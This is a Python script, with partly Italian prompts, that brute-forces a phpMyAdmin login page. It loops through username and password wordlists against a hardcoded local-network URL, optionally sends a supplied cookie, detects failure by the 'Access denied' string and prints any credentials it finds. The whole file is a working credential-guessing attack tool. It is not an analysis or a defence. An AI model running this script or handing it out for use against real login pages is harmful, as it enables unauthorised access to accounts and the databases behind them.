import requests

def readFile(text):
	with open(text) as file:
		lines = file.read().splitlines()
	return lines

print("""Welcome, make sure you have your password file inside your directory in order to just write the name
	when asked, otherwise you will have to specify the location of the file""")

#url = input("[~]Enter Page URL==> ")
url = "http://192.168.1.3/phpMyAdmin/"
#username_file = input("[~]Enter Username File To Use==> ")
username_file = "usernames.txt"
#password_file = input("[~]Enter Password File To Use==> ")
password_file = "passwords.txt"
#login_failed_string = input("[~]Enter String That Occurs When Login Fails==> ")
login_failed_string = "Access denied"

username_list = readFile(username_file)
password_list = readFile(password_file)

n_usernames = len(username_list)
n_passwords = len(password_list)

print(f"Ecco i {n_usernames} presenti all'interno del file:\n")
for index,username in enumerate(username_list):
	print(f"[{index + 1}] {username}")

input_indice_utente = int(input("\nDa quale USERNAME vuoi iniziare il Bruteforce?  "))
cookie_value = input("\n[Opzionale] Enter Cookie Value [Optional]==>")

i = input_indice_utente - 1

while i < n_usernames:
	username_loop = username_list[i]
	for password in password_list:
		print(f"Trying---[Username]={username_loop}  with\t[Password]={password}")
		data = {"username":username_loop,"password":password,"Login":"submit"}
		if cookie_value != "":
			response = requests.get(url, params={"pma_username":username_loop,"pma_password":password,"Go":"submit"}, cookies = {"Cookie":cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print("[+]Found Username: => " + username_loop)
			print("[+]Found Password: => " + password)
			exit()
	i += 1


print("[-]ERROR[-]")
